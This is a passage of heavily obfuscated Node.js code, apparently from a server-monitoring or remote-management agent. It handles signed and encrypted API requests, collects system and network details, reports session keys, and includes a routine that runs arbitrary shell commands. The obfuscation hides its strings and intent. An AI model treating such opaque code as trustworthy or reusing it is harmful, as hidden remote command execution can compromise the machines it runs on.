            }), l = k[bv(0x805)](b[bv(0xb9)](k[bv(0x7bc)], 0x41)), m = Math[bv(0x15d)](Date[bv(0x4b6)]() / 0x3e8), n = b['GCrmD'](a, 0xe10);
        return {
            'key_id': a0k[bv(0x1ee)](0x8)[bv(0xec)](bv(0x4e4)),
            'created_at': m,
            'expires_at': b[bv(0x228)](m, n),
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[bv(0xec)](b['zwQyy']),
            'ecies_public_key': i[bv(0xec)](b[bv(0x469)]),
            'ecdsa_private_hex': Buffer[bv(0x664)](j['d'], bv(0x420))[bv(0xec)](b['zwQyy']),
            'ecdsa_public_b64': Buffer[bv(0x664)](a0A[bv(0x657)][bv(0x4bd)](l)[bv(0x38e)](!![]))['toString'](bv(0x2df)),
            'ecies_public_b64': Buffer[bv(0x664)](a0B['getPublicKey'](h, !![]))['toString'](b['Buwav']),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0R {
    constructor(a, b) {
        const bw = a0aY, c = {
                'gchgU': bw(0x2c1),
                'PySIm': function (d, f) {
                    return d(f);
                }
            };
        this[bw(0x5fa)] = null, this[bw(0x751)] = null;
        if (a)
            try {
                const d = a[bw(0x450)]();
                if (d['startsWith'](c[bw(0x6d4)]))
                    this[bw(0x5fa)] = a0k[bw(0x118)](d);
                else {
                    const f = Buffer[bw(0x664)](d, bw(0x2df)), g = a0A[bw(0x657)]['fromBytes'](f), h = g[bw(0x38e)](![]), i = m => m['toString'](bw(0x2df))[bw(0xed)](/\+/g, '-')['replace'](/\//g, '_')['replace'](/=/g, ''), j = i(Buffer[bw(0x664)](h[bw(0x462)](0x1, 0x21))), k = c[bw(0x355)](i, Buffer[bw(0x664)](h[bw(0x462)](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': bw(0x4ad),
                            'x': j,
                            'y': k
                        };
                    this[bw(0x5fa)] = a0k['createPublicKey']({
                        'key': l,
                        'format': bw(0x279)
                    });
                }
            } catch (m) {
                a0D['error']('⚠️\x20ECDSA公钥加载失败:\x20' + m[bw(0x5a9)]), this[bw(0x5fa)] = null;
            }
        if (b)
            try {
                this[bw(0x751)] = a0w[bw(0x18c)](b[bw(0x450)]());
            } catch (n) {
                a0D[bw(0x10d)](bw(0x3ed) + n['message']);
            }
    }
    [a0aY(0x6ae)](a, b, c, d, f, g, h = null) {
        const bx = a0aY, i = {
                'JhCNh': 'ECDSA\x20public\x20key\x20not\x20loaded',
                'ULTWJ': function (j, k) {
                    return j(k);
                },
                'BSMOo': function (j, k) {
                    return j / k;
                },
                'KHHPi': function (j, k) {
                    return j > k;
                },
                'ZhWRp': function (j, k) {
                    return j - k;
                },
                'jkuKT': function (j, k) {
                    return j - k;
                },
                'pbZot': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'ILEvl': bx(0x738),
                'ibBKM': bx(0xc3)
            };
        if (!this[bx(0x5fa)])
            throw new Error(i[bx(0x6fd)]);
        try {
            const j = i[bx(0x533)](parseInt, f), k = Math[bx(0x15d)](i[bx(0x80d)](Date['now'](), 0x3e8));
            if (i[bx(0x28c)](Math[bx(0x5c4)](i[bx(0x458)](k, j)), a0P[bx(0x316)]))
                throw new Error(bx(0x2ad) + Math[bx(0x5c4)](i['jkuKT'](k, j)) + 's\x20>\x20' + a0P[bx(0x316)] + 's');
            const l = i[bx(0x2dd)](a0S, a, b, c, d, f);
            if (this[bx(0x1a8)](this[bx(0x5fa)], l, g))
                return bx(0x4de);
            if (h && this[bx(0x1a8)](h, l, g))
                return i[bx(0x484)];
            throw new Error(i['ibBKM']);
        } catch (m) {
            throw new Error(bx(0x464) + m['message']);
        }
    }
    [a0aY(0x1a8)](a, b, c) {
        const by = a0aY, d = { 'OAych': 'SHA256' };
        if (!a)
            return ![];
        try {
            const f = a0w[by(0x18c)](c), g = a0k[by(0x102)](d[by(0x735)]);
            return g[by(0x199)](b), g[by(0x78c)](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0aY(0x762)](a, b = null) {
        const bz = a0aY, c = {
                'GAHOE': 'ECIES\x20public\x20key\x20not\x20initialized,\x20cannot\x20encrypt\x20response',
                'dzmBb': function (d, f, g) {
                    return d(f, g);
                },
                'AgFWz': 'base64'
            };
        if (a0P['DEBUG'])
            return JSON[bz(0x823)](a);
        if (!this[bz(0x751)])
            throw new Error(c[bz(0x67d)]);
        try {
            const d = JSON[bz(0x823)](a), f = Buffer[bz(0x664)](d, 'utf-8'), g = b || Buffer[bz(0x664)](this[bz(0x751)]), h = c['dzmBb'](a0v, g, f);
            return Buffer[bz(0x664)](h)[bz(0xec)](c[bz(0x7b6)]);
        } catch (i) {
            throw new Error(bz(0x4c1) + i[bz(0x5a9)]);
        }
    }
    [a0aY(0x727)](a, b) {
        const bA = a0aY, c = {
                'nZdrb': function (d, f) {
                    return d !== f;
                },
                'UJNNA': bA(0x2df),
                'BRNGB': 'utf8',
                'GTixh': bA(0x69e)
            };
        if (!b || c[bA(0x266)](b[bA(0x7bc)], 0x20))
            throw new Error(bA(0x24a));
        try {
            const d = Buffer[bA(0x664)](a, c[bA(0x1e2)])[bA(0xec)](c[bA(0x1b6)]), f = JSON[bA(0x517)](d);
            if (!f[bA(0x68d)] || !f[bA(0x4a9)] || !f[bA(0x23a)])
                throw new Error(bA(0x707));
            const g = Buffer[bA(0x664)](f[bA(0x68d)], c[bA(0x1e2)]), h = Buffer[bA(0x664)](f[bA(0x4a9)], c[bA(0x1e2)]), i = Buffer['from'](f[bA(0x23a)], c[bA(0x1e2)]), j = a0k['createDecipheriv'](c[bA(0xa0)], b, g);
            j[bA(0x3e8)](h);
            let k = j[bA(0x199)](i, null, bA(0x31e));
            return k += j[bA(0x550)](c[bA(0x1b6)]), k;
        } catch (l) {
            throw new Error(bA(0x105) + l[bA(0x5a9)]);
        }
    }
    [a0aY(0x17c)](a, b) {
        const bB = a0aY, c = {
                'engZb': function (d, f) {
                    return d !== f;
                },
                'sskkY': 'base64',
                'sVGiA': bB(0x31e)
            };
        if (!b || c['engZb'](b[bB(0x7bc)], 0x20))
            throw new Error(bB(0x48b));
        try {
            const d = a0k[bB(0x1ee)](0xc), f = a0k[bB(0xf0)](bB(0x69e), b, d), g = Buffer[bB(0x12a)]([
                    f['update'](a),
                    f[bB(0x550)]()
                ]), h = f[bB(0xad)](), i = {
                    'nonce': d[bB(0xec)](c['sskkY']),
                    'tag': h[bB(0xec)](bB(0x2df)),
                    'ciphertext': g[bB(0xec)](c[bB(0x6de)])
                };
            return Buffer['from'](JSON[bB(0x823)](i), c[bB(0x159)])['toString'](c[bB(0x6de)]);
        } catch (j) {
            throw new Error(bB(0x82f) + j[bB(0x5a9)]);
        }
    }
}
function a0S(a, b, c, d, f) {
    const bC = a0aY, g = {
            'kumEV': 'sha256',
            'PecrJ': 'hex'
        };
    return !c && (c = a0k[bC(0x60c)](g[bC(0x6f2)])[bC(0x199)](Buffer[bC(0x4b7)](0x0))[bC(0x546)](g[bC(0x4df)])), a + '\x0a' + b + '\x0a' + c + '\x0a' + d + '\x0a' + f;
}
function a0T(a, b = null) {
    const bD = a0aY, c = {
            'CCyKY': function (d, f) {
                return d === f;
            },
            'qOLqq': bD(0x446),
            'XMLdv': bD(0x6c5),
            'rUfLr': bD(0x2ea),
            'eFaXj': bD(0x1ef),
            'xqmgi': bD(0x2bd),
            'yLErY': bD(0x6cb),
            'gnxdg': bD(0x738),
            'ORLHg': function (d, f) {
                return d === f;
            },
            'WqJwj': bD(0x31e),
            'fCQGn': bD(0x63f),
            'oMKcq': '/api/ws/',
            'psVSl': function (d, f) {
                return d === f;
            },
            'qpIpr': bD(0xc6),
            'QcKAx': bD(0x60f),
            'UpReB': bD(0x4a2),
            'iEjhe': 'x-nonce',
            'rdmSp': bD(0xb8),
            'xekaP': bD(0x472),
            'xleLK': bD(0x155),
            'VvMtI': bD(0x680),
            'qrLke': bD(0x6e4),
            'lMUDQ': function (d) {
                return d();
            },
            'lmoVo': bD(0xbf),
            'HrAAP': function (d, f) {
                return d !== f;
            },
            'LVoLv': bD(0x38f),
            'wgdYk': bD(0x770),
            'vRysw': 'sha256',
            'UwiQE': 'hex',
            'qrgdh': 'x-aes-encrypted',
            'DNEvF': 'base64',
            'iceMy': bD(0x49c),
            'yFwCx': function (d) {
                return d();
            }
        };
    return async (d, f, g) => {
        const bF = bD, h = {
                'BcknN': function (o, p) {
                    const bE = a0b;
                    return c[bE(0x5ae)](o, p);
                },
                'oRvNh': c['qOLqq'],
                'WBjRQ': c[bF(0x639)],
                'KlTuk': c[bF(0x5c6)],
                'HtLlH': c[bF(0x648)],
                'lHXjB': c[bF(0x5ea)],
                'OqLfg': c[bF(0x62f)],
                'qHWJK': c[bF(0x46f)],
                'ZJyXD': function (o, p) {
                    const bG = bF;
                    return c[bG(0x20b)](o, p);
                },
                'uZzwV': c[bF(0x81c)],
                'ZCjjq': 'base64',
                'dcZXs': c[bF(0x755)],
                'xYeRX': bF(0x412)
            };
        if (d[bF(0x7d7)]['startsWith'](c[bF(0x684)]))
            return g();
        const i = f['send'];
        f[bF(0x597)] = function (o) {
            const bH = bF;
            if (a0P[bH(0x55a)]) {
                const p = h[bH(0x7fc)](typeof o, h[bH(0x33e)]) ? o : Buffer[bH(0x496)](o) ? o : JSON['stringify'](o);
                return f[bH(0x39b)](h[bH(0x5aa)], h[bH(0x64f)]), f[bH(0x39b)](h['HtLlH'], Buffer[bH(0xe0)](p)[bH(0xec)]()), i[bH(0xe6)](this, p);
            }
            if (f[bH(0x7dd)](bH(0x2bd)) && f['get'](h[bH(0x7aa)])[bH(0x7a2)]('application/json'))
                try {
                    if (d[bH(0x2cc)]) {
                        let q;
                        if (h[bH(0x7fc)](d['path'], h['OqLfg'])) {
                            const r = h['BcknN'](typeof o, bH(0x446)) ? JSON[bH(0x517)](o) : o;
                            let s = null;
                            h[bH(0x7fc)](d[bH(0x455)], h[bH(0x548)]) && b && (s = b[bH(0x3f4)]());
                            const t = a[bH(0x762)](r, s);
                            q = h[bH(0x4bf)](typeof t, h[bH(0x33e)]) ? t : JSON[bH(0x823)](t);
                        } else {
                            const u = Buffer[bH(0x496)](o) ? o : typeof o === h[bH(0x33e)] ? Buffer[bH(0x664)](o, h['uZzwV']) : Buffer[bH(0x664)](JSON[bH(0x823)](o), h[bH(0x397)]);
                            q = a['encryptData'](u, Buffer['from'](a0P[bH(0x3bb)], h['ZCjjq']));
                        }
                        return f[bH(0x39b)](h['WBjRQ'], h[bH(0x273)]), f[bH(0x39b)](bH(0x2fe), a0P[bH(0xbd)]), f['set'](h[bH(0x67c)], Buffer[bH(0xe0)](q, bH(0x31e))[bH(0xec)]()), i['call'](this, q);
                    } else {
                        const v = h['BcknN'](typeof o, bH(0x446)) ? o : JSON['stringify'](o);
                        return f[bH(0x39b)](h[bH(0x67c)], Buffer[bH(0xe0)](v, h[bH(0x397)])['toString']()), i[bH(0xe6)](this, v);
                    }
                } catch (w) {
                    if (!f[bH(0x5b1)]) {
                        const x = JSON[bH(0x823)]({ 'error': bH(0x769) + w[bH(0x5a9)] });
                        return f[bH(0x75d)](0x1f4), f['set'](h[bH(0x7aa)], h[bH(0x2e0)]), f[bH(0x39b)]('Content-Length', Buffer[bH(0xe0)](x, h[bH(0x397)])[bH(0xec)]()), i['call'](this, x);
                    }
                    throw w;
                }
            return i[bH(0xe6)](this, o);
        };
        const j = f[bF(0x581)];
        f[bF(0x581)] = function (...o) {
            const bI = bF;
            return a0P[bI(0x55a)] && !f[bI(0x7dd)](h[bI(0x5aa)]) && f[bI(0x39b)](h[bI(0x5aa)], h[bI(0x64f)]), j['apply'](this, o);
        };
        if (c[bF(0x2dc)](d[bF(0x57b)], c['qpIpr']) || c[bF(0x20b)](d[bF(0x57b)], c['QcKAx']))
            return a0P[bF(0x55a)] && f[bF(0x39b)](bF(0x6c5), c[bF(0x5c6)]), g();
        d[bF(0x2cc)] = ![];
        const k = [
            bF(0x6cb),
            c[bF(0x6d3)]
        ];
        if (a0P[bF(0x55a)])
            return d[bF(0x2cc)] = !![], g();
        const l = d[bF(0xce)][c[bF(0x214)]] || d['headers'][c['rdmSp']], m = d[bF(0xce)][c[bF(0x846)]] || d[bF(0xce)][c[bF(0x32b)]], n = d['headers'][c[bF(0x296)]] || d[bF(0xce)][c[bF(0x46c)]];
        if (!l || !m || !n)
            return k[bF(0x7a2)](d[bF(0x7d7)]) ? c[bF(0x221)](g) : f[bF(0x75d)](0x191)[bF(0x41f)]({ 'error': c[bF(0x556)] });
        try {
            let o = Buffer[bF(0x4b7)](0x0);
            if (c[bF(0x7f9)](d['path'], c[bF(0x49b)])) {
                if (Buffer['isBuffer'](d[bF(0x3dd)]))
                    o = d[bF(0x3dd)];
                else {
                    if (c[bF(0x20b)](typeof d[bF(0x3dd)], c[bF(0x816)]))
                        o = Buffer[bF(0x664)](d['body'], c[bF(0x5be)]);
                }
            }
            const p = o[bF(0x7bc)] > 0x0 ? a0k['createHash'](c[bF(0x627)])[bF(0x199)](o)['digest'](c['UwiQE']) : '', q = b ? b['getActiveEcdsaVk']() : null, r = a[bF(0x6ae)](d['method'], d[bF(0x7d7)], p, l, m, n, q);
            d[bF(0x2cc)] = !![], d[bF(0x455)] = c['CCyKY'](r, c[bF(0x46f)]) ? c[bF(0x46f)] : bF(0x4de);
        } catch (s) {
            return k[bF(0x7a2)](d['path']) ? c[bF(0x221)](g) : f[bF(0x75d)](0x191)['json']({ 'error': bF(0x464) + s[bF(0x5a9)] });
        }
        if (d[bF(0x3dd)] && c[bF(0x2dc)](typeof d[bF(0x3dd)], c[bF(0x816)])) {
            const t = c[bF(0x5ae)]((d[bF(0xce)][c[bF(0x3ec)]] || '')['toLowerCase'](), c['fCQGn']);
            try {
                if (t && d[bF(0x2cc)]) {
                    const u = Buffer[bF(0x664)](a0P[bF(0x3bb)], c[bF(0x438)]), v = a[bF(0x727)](d['body'], u);
                    d['body'] = JSON[bF(0x517)](v);
                } else {
                    if (d[bF(0x3dd)][bF(0x315)](c[bF(0x406)])) {
                        const w = Buffer['from'](d['body'], bF(0x2df))[bF(0xec)](bF(0x770));
                        d[bF(0x3dd)] = JSON[bF(0x517)](w);
                    } else {
                        if (d[bF(0x3dd)]['trim']()['startsWith']('{') || d['body'][bF(0x450)]()[bF(0x315)]('['))
                            d['body'] = JSON[bF(0x517)](d['body']);
                        else {
                            if (c[bF(0x5ae)](d[bF(0x3dd)][bF(0x450)](), ''))
                                d[bF(0x3dd)] = {};
                        }
                    }
                }
            } catch (x) {
                return a0D['error'](bF(0x263) + x[bF(0x5a9)]), f[bF(0x75d)](0x190)[bF(0x41f)]({ 'error': bF(0x3bc) + x['message'] });
            }
        }
        c['yFwCx'](g);
    };
}
class a0U {
    constructor() {
        const bJ = a0aY;
        this['lastNetworkStats'] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[bJ(0x477)] = 0x0, this[bJ(0x206)] = 0x0, this[bJ(0x5a3)] = Date[bJ(0x4b6)]() / 0x3e8;
    }
    async [a0aY(0x2c3)]() {
        const bK = a0aY, a = {
                'KoDzG': '/sys/fs/cgroup/memory.max',
                'KxelI': function (d, f) {
                    return d === f;
                },
                'OjXHD': function (d, f, g) {
                    return d(f, g);
                },
                'dUWlK': '/sys/fs/cgroup/memory.current',
                'pBTXn': bK(0x31e),
                'AufmG': function (d, f, g) {
                    return d(f, g);
                },
                'DaHCb': '/sys/fs/cgroup/memory/memory.limit_in_bytes',
                'VnQow': bK(0x483),
                'AnosJ': function (d, f) {
                    return d === f;
                },
                'UfDtZ': function (d, f) {
                    return d === f;
                },
                'XoJVT': function (d, f) {
                    return d(f);
                },
                'umUty': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m['readFile'](a['KoDzG'], bK(0x31e)))['trim']();
            b = a[bK(0x4ae)](d, bK(0x217)) ? null : a[bK(0x754)](parseInt, d, 0xa), c = a[bK(0x754)](parseInt, (await a0m[bK(0x1f4)](a[bK(0x226)], a[bK(0x6c4)]))['trim'](), 0xa);
        } catch {
            try {
                b = a['AufmG'](parseInt, (await a0m[bK(0x1f4)](a[bK(0x609)], a[bK(0x6c4)]))[bK(0x450)](), 0xa), c = parseInt((await a0m['readFile'](a[bK(0x10e)], a['pBTXn']))['trim'](), 0xa);
                if (b > 0x7ffffffffffff000)
                    b = null;
            } catch {
                const f = await a0u[bK(0x6c9)]();
                b = f['total'], c = f[bK(0x528)];
            }
        }
        if (a[bK(0x4aa)](b, null)) {
            const g = await a0u[bK(0x6c9)]();
            b = g[bK(0x374)], (a[bK(0x216)](c, null) || a['XoJVT'](isNaN, c)) && (c = g[bK(0x528)]);
        }
        return {
            'total': b,
            'used': c,
            'available': b - c,
            'free': a[bK(0x649)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const bL = a0aY, [a, b, c, d] = await Promise[bL(0x2f5)]([
                a0u[bL(0x5b9)](),
                this['getContainerMemory'](),
                a0u[bL(0x51d)](),
                a0u[bL(0x4e8)]()
            ]);
        let f = null, g = null;
        try {
            [f, g] = await Promise[bL(0x2f5)]([
                this[bL(0x4e9)](),
                this[bL(0x60b)]()
            ]);
        } catch (h) {
            a0D[bL(0x4a6)]('获取\x20IP\x20地址失败:\x20' + h[bL(0x5a9)], 0x1);
        }
        return {
            'arch': a0p[bL(0x559)](),
            'cpu_cores': a[bL(0x122)],
            'cpu_name': a['brand'],
            'disk_total': (await a0u[bL(0x72a)]())[0x0]?.['size'] || 0x0,
            'gpu_name': '',
            'ipv4': f,
            'ipv6': g,
            'mem_total': b[bL(0x374)],
            'os': c[bL(0x398)] + '\x20' + c['release'],
            'kernel_version': c['kernel'],
            'swap_total': b['swaptotal'],
            'version': a0P[bL(0xbd)],
            'virtualization': await this[bL(0x2f7)](),
            'session_key': a0P[bL(0x3bb)],
            'noise_key': a0P[bL(0x42b)]
        };
    }
    [a0aY(0x3e3)]() {
        const bM = a0aY, a = {
                'tBlCG': bM(0x7d6),
                'qMKES': function (c, d) {
                    return c === d;
                }
            }, b = a0p[bM(0x4e8)]();
        for (const c of Object[bM(0x80a)](b)) {
            for (const d of b[c]) {
                const f = d['family'] === a[bM(0x2e2)] || a['qMKES'](d[bM(0x1de)], 0x4);
                if (f && !d[bM(0x5cd)]) {
                    if (!/^10\./['test'](d['address']) && !/^192\.168\./[bM(0x75b)](d[bM(0x564)]) && !/^172\.(1[6-9]|2[0-9]|3[0-1])\./[bM(0x75b)](d[bM(0x564)]))
                        return d['address'];
                }
            }
        }
        return null;
    }
    async [a0aY(0x4e9)]() {
        const bN = a0aY, a = {
                'xwBoU': bN(0x30e),
                'AwxVF': bN(0x2e7),
                'VMMuc': bN(0x5e2),
                'znaRH': bN(0x2ac),
                'dFeOz': bN(0x1bb),
                'DfdRz': bN(0x547)
            }, b = [
                a[bN(0x7fe)],
                a['AwxVF'],
                a[bN(0x312)],
                a[bN(0x63d)],
                a['dFeOz'],
                bN(0x2a2),
                a[bN(0x764)]
            ];
        for (const d of b) {
            try {
                const f = await this[bN(0x20e)](d, 0x4);
                if (f && this[bN(0x3d7)](f))
                    return f;
            } catch (g) {
                continue;
            }
        }
        const c = this[bN(0x3e3)]();
        if (c && this[bN(0x3d7)](c))
            return c;
        return null;
    }
    [a0aY(0x42d)]() {
        const bO = a0aY, a = {
                'xOnYF': function (c, d) {
                    return c === d;
                },
                'hGaZv': function (c, d) {
                    return c === d;
                },
                'hQmNY': bO(0x361)
            }, b = a0p[bO(0x4e8)]();
        for (const c of Object['keys'](b)) {
            for (const d of b[c]) {
                const f = a[bO(0x643)](d[bO(0x1de)], bO(0x1f0)) || a[bO(0x810)](d['family'], 0x6);
                if (f && !d[bO(0x5cd)]) {
                    if (!d[bO(0x564)][bO(0x4ee)]()[bO(0x315)](a[bO(0x5e0)]))
                        return d[bO(0x564)];
                }
            }
        }
        return null;
    }
    async [a0aY(0x60b)]() {
        const bP = a0aY, a = {
                'ORSIz': bP(0x4ef),
                'lwpxC': bP(0x2e7)
            }, b = this[bP(0x42d)]();
        if (b && this[bP(0x6c1)](b))
            return b;
        const c = [
            a['ORSIz'],
            a[bP(0x256)],
            'https://v6.ident.me'
        ];
        for (const d of c) {
            try {
                const f = await this[bP(0x20e)](d, 0x6);
                if (f && this[bP(0x6c1)](f))
                    return f;
            } catch (g) {
                a0D['debug'](bP(0x4ea) + d + bP(0x702) + g['message']);
                continue;
            }
        }
        return null;
    }
    async [a0aY(0x20e)](a, b = 0x0) {
        const bQ = a0aY, c = {
                'bJXrZ': function (d, f) {
                    return d(f);
                },
                'xAqBT': bQ(0x68e),
                'pNbTN': bQ(0x54a),
                'sArcV': bQ(0x61d),
                'EWvVb': 'text/plain',
                'tRwzp': bQ(0x1c6)
            };
        return new Promise((d, f) => {
            const bR = bQ, g = { 'vbHFT': c[bR(0x237)] }, h = c['bJXrZ'](require, c[bR(0x6e6)]), i = {
                    'timeout': 0x1388,
                    'family': b,
                    'headers': { 'Accept': c[bR(0x507)] }
                }, j = h['get'](a, i, k => {
                    const bS = bR;
                    let l = '';
                    if (k[bS(0x62b)] !== 0xc8) {
                        f(new Error(bS(0x43c) + k[bS(0x62b)]));
                        return;
                    }
                    k['on'](g[bS(0x5f3)], m => l += m), k['on'](bS(0x581), () => d(l[bS(0x450)]()));
                });
            j['on'](c[bR(0x35e)], f), j[bR(0x352)](0x1388, () => {
                const bT = bR;
                j[bT(0x541)](), c[bT(0x6cf)](f, new Error(c[bT(0x4f5)]));
            });
        });
    }
    [a0aY(0x3d7)](a) {
        const bU = a0aY;
        return /^(\d{1,3}\.){3}\d{1,3}$/[bU(0x75b)](a);
    }
    [a0aY(0x6c1)](a) {
        const bV = a0aY;
        if (!/^[0-9a-fA-F:]+$/[bV(0x75b)](a) || !a[bV(0x7a2)](':'))
            return ![];
        if (/^(fe[89ab]|f[cd]|::1$|::$)/i[bV(0x75b)](a))
            return ![];
        return !![];
    }
    async [a0aY(0x72b)]() {
        const bW = a0aY, a = {
                'HjKqc': function (m, n) {
                    return m / n;
                },
                'JGQPE': function (m, n) {
                    return m - n;
                },
                'IHYZz': function (m, n) {
                    return m * n;
                },
                'WliER': function (m, n) {
                    return m * n;
                },
                'ZRTON': function (m, n) {
                    return m * n;
                },
                'PBleY': function (m, n) {
                    return m / n;
                }
            }, [b, c, d, f] = await Promise[bW(0x2f5)]([
                a0u['currentLoad'](),
                a0u[bW(0x6c9)](),
                a0u[bW(0x7d8)](),
                a0u[bW(0x7f7)]()
            ]), g = d[0x0] || {
                'tx_bytes': 0x0,
                'rx_bytes': 0x0
            }, h = a[bW(0x61f)](Date[bW(0x4b6)](), 0x3e8), i = a[bW(0xe8)](h, this[bW(0x5a3)]), j = a[bW(0xe8)](g[bW(0x1cd)], this[bW(0x293)]['tx']), k = g[bW(0x4c0)] - this[bW(0x293)]['rx'];
        this['totalNetworkUp'] += j, this[bW(0x206)] += k, this[bW(0x293)] = {
            'tx': g[bW(0x1cd)],
            'rx': g[bW(0x4c0)]
        }, this[bW(0x5a3)] = h;
        const l = await a0u[bW(0x323)]();
        return {
            'cpu': { 'usage': Math[bW(0x7e2)](b[bW(0x7f7)]) },
            'ram': {
                'total': c['total'],
                'used': c[bW(0x838)]
            },
            'swap': {
                'total': c[bW(0xf8)],
                'used': c['swapused']
            },
            'load': {
                'load1': Math[bW(0x7e2)](a[bW(0x310)](f['avgLoad'], 0x64)) / 0x64,
                'load5': a[bW(0x61f)](Math['round'](a[bW(0x17e)](f[bW(0x3eb)], 0x64)), 0x64),
                'load15': a[bW(0x61f)](Math[bW(0x7e2)](a[bW(0x115)](f[bW(0x3eb)], 0x64)), 0x64)
            },
            'disk': await this['_getDiskInfo'](),
            'network': {
                'up': Math[bW(0x7e2)](a['HjKqc'](j, i)),
                'down': Math[bW(0x7e2)](a['PBleY'](k, i)),
                'totalUp': this['totalNetworkUp'],
                'totalDown': this[bW(0x206)]
            },
            'connections': await this[bW(0x53b)](),
            'uptime': a0p['uptime'](),
            'process': l?.[bW(0x2f5)] || 0x0,
            'message': ''
        };
    }
    async [a0aY(0x2f7)]() {
        const bX = a0aY, a = {
                'GpJLK': bX(0x1ec),
                'qFvIc': bX(0x498),
                'unIzl': bX(0x629),
                'sykjQ': bX(0x1d4),
                'hczCv': bX(0x47d),
                'MGqQd': bX(0x63c),
                'iUlbB': bX(0x509),
                'CoFDu': bX(0x545),
                'HqISo': bX(0x842),
                'CgIIS': bX(0x817),
                'OrBBe': bX(0x31e),
                'Vmnjq': bX(0x1a4),
                'ppobh': bX(0x553),
                'rfyCy': bX(0x43b),
                'bHlsD': bX(0x7f1),
                'jejvR': bX(0x5e1),
                'tMIwa': bX(0x408),
                'zAByU': 'KVM',
                'qDvKd': bX(0x7f0)
            };
        try {
            if (a0l['existsSync'](a[bX(0x56c)]))
                return a[bX(0x218)];
            if (a0l['existsSync'](a[bX(0x10b)]))
                return bX(0x319);
            if (a0l[bX(0x291)](a[bX(0x3fb)])) {
                const b = a0l[bX(0x23e)](a[bX(0x3fb)], bX(0x31e))[bX(0x4ee)]();
                if (b[bX(0x7a2)](bX(0x1f9)) || b[bX(0x7a2)](a['hczCv']))
                    return a[bX(0x218)];
                else {
                    if (b['includes'](a[bX(0xb2)]))
                        return a[bX(0x4a8)];
                    else {
                        if (b[bX(0x7a2)](a[bX(0x3e1)]))
                            return a[bX(0x129)];
                    }
                }
            }
            if (a0l[bX(0x291)](a[bX(0x2f0)])) {
                const c = a0l[bX(0x23e)](a[bX(0x2f0)], a[bX(0x6ca)]);
                if (c[bX(0x7a2)](a[bX(0x451)]) || c[bX(0x7a2)]('workdir=/var/lib/docker'))
                    return a['qFvIc'];
                else {
                    if (c['includes'](bX(0x820)) || c['includes'](a[bX(0x132)]))
                        return a[bX(0x4a8)];
                }
            }
            if (a0l[bX(0x291)](a[bX(0x244)])) {
                const d = a0l[bX(0x23e)]('/proc/1/environ', a['OrBBe']);
                if (d[bX(0x7a2)](a[bX(0x606)]))
                    return a[bX(0x129)];
            }
            if (a0l[bX(0x291)](a[bX(0x6fa)])) {
                const f = a0l['readFileSync'](a['jejvR'], 'utf8');
                if (f[bX(0x7a2)](a[bX(0x25a)]) || f[bX(0x7a2)](a[bX(0x82c)]))
                    return a[bX(0x25a)];
            }
        } catch (g) {
        }
        return a['qDvKd'];
    }
    async [a0aY(0x66f)]() {
        const bY = a0aY, a = {
                'CEnZm': function (b, c) {
                    return b !== c;
                },
                'DVxqw': bY(0x48f),
                'biDID': bY(0x15b)
            };
        try {
            const b = await a0u[bY(0x72a)](), c = b[bY(0xfb)](g => {
                    const bZ = bY;
                    return g['size'] > 0x0 && g[bZ(0x565)] !== bZ(0x41e) && a[bZ(0x42f)](g['type'], a[bZ(0x50e)]) && g['fs']['startsWith'](a['biDID']);
                }), d = c[bY(0x2da)]((g, h) => g + h[bY(0x540)], 0x0), f = c[bY(0x2da)]((g, h) => g + h[bY(0x528)], 0x0);
            return {
                'total': d,
                'used': f
            };
        } catch {
            return {
                'total': 0x0,
                'used': 0x0
            };
        }
    }
    async [a0aY(0x53b)]() {
        const c0 = a0aY;
        try {
            const a = await a0u[c0(0x763)](), b = a['filter'](d => d[c0(0x1c5)] === c0(0x147))['length'], c = a['filter'](d => d[c0(0x1c5)] === c0(0x590))[c0(0x7bc)];
            return {
                'tcp': b,
                'udp': c
            };
        } catch {
            return {
                'tcp': 0x0,
                'udp': 0x0
            };
        }
    }
}
class a0V {
    static async [a0aY(0x698)](a, b = {}) {
        const c1 = a0aY, c = {
                'oDPfc': function (d, f) {
                    return d - f;
                },
                'YriOa': function (d, f) {
                    return d || f;
                },
                'umLzB': function (d, f) {
                    return d === f;
                },
                'HyMlI': c1(0xdf),
                'DMkGv': function (d, f) {
                    return d(f);
                },
                'DSnAq': function (d, f, g, h) {
                    return d(f, g, h);
                },
                'KXLNL': function (d, f) {
                    return d * f;
                }
            }, {
                cwd: cwd = process[c1(0x5ff)](),
                env: env = {},
                timeout: timeout = a0P[c1(0x5f1)]
            } = b;
        return new Promise(d => {
            const c2 = c1, f = Date[c2(0x4b6)](), g = c[c2(0x721)](a0r, a, {
                    'cwd': cwd,
                    'env': {
                        ...process.env,
                        ...env
                    },
                    'timeout': timeout * 0x3e8,
                    'maxBuffer': c[c2(0x160)](0xa * 0x400, 0x400)
                }, (h, i, j) => {
                    const c3 = c2, k = c[c3(0x39e)](Date['now'](), f), l = h && h[c3(0x16f)] && h[c3(0x516)];
                    let m = c[c3(0x7ae)](i, '');
                    if (j)
                        m += j;
                    let n = 0x0;
                    if (h) {
                        if (l)
                            n = 0x7c;
                        else
                            c[c3(0x76d)](typeof h[c3(0x2be)], c['HyMlI']) ? n = h[c3(0x2be)] : n = -0x1;
                    }
                    c[c3(0x578)](d, {
                        'result': m,
                        'exitcode': n,
                        'timeout': l,
                        'cmd': a
                    });
                });
        });
    }
}
function a0W(a) {
    const c4 = a0aY;
    try {
        const b = a0l[c4(0x65e)][c4(0xa8)](a0o[c4(0x2c6)](a0P[c4(0x394)])), c = a0o['resolve'](a);
        let d = c;
        while (!a0l[c4(0x291)](d)) {
            const i = a0o['dirname'](d);
            if (i === d)
                return ![];
            d = i;
        }
        const f = a0l['realpathSync']['native'](d), g = a0o['relative'](b, f);
        if (g['startsWith']('..') || a0o[c4(0x13c)](g))
            return ![];
        const h = a0o[c4(0x5a5)](d, c);
        if (h && (h[c4(0x315)]('..') || a0o[c4(0x13c)](h)))
            return ![];
        return !![];
    } catch (j) {
        return ![];
    }
}
class a0X {
    static ['ZIP_MAX_ENTRIES'] = 0x4e20;
